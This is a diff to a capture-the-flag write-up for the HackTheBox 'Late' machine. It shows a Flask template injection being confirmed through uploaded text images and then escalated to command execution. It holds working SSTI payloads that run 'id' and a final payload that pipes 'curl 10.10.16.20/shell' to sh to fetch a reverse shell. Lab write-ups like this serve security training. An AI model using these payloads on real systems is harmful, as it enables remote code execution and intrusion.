@@ -55,8 +55,55 @@ wfuzz -u "http://late.htb" -H "Host: FUZZ.late.htb" -w SecLists/Discovery/DNS/su
 
 
 3. Interesting, since it said that it built with Flask, hence it could related to SSTI vuln.
-4. Let's check that by uploading a file which has regex operation such --> {{7*7}}.
-5. I used [this](https://onlinetexttools.com/convert-text-to-image) online tool to convert text to image with ease.
+4. Let's check that by uploading a file which has regex operation such --> {{ 7*7 }}.
+5. I used [this](https://smallseotools.com/text-to-image/) online tool to convert text to image with ease.
+6. After uploaded the image, automatically we got this:
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/517934d4-4034-4c13-b418-75f11326dab7)
+
+
+```
+┌──(brandy㉿bread-yolk)-[~/Downloads]
+└─$ cat results.txt
+<p>49
+</p>
+```
+
+7. Great! This should be our foothold.
+8. Let's try to run simple SSTI payload to check whether there is filter.
+
+```
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bf026a13-e379-4b42-925b-5d8a5d5c5198)
+
+
+9. To fix this I tried to change the font to monospace, background color to black, font color to white, and zoom level max.
+
+```
+┌──(brandy㉿bread-yolk)-[~/Downloads]
+└─$ cat results.txt
+<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
+
+</p>
+```
+
+10. Nice! Even the basic payload is executed, let's send our reverse shell payload.
+
+> PAYLOAD
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b4ab6cd4-f645-47e8-8300-7775c36f35a9)
+
+
+> What to send
+
+```
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl 10.10.16.20/shell | sh').read() }}
+```
+
 
 
 
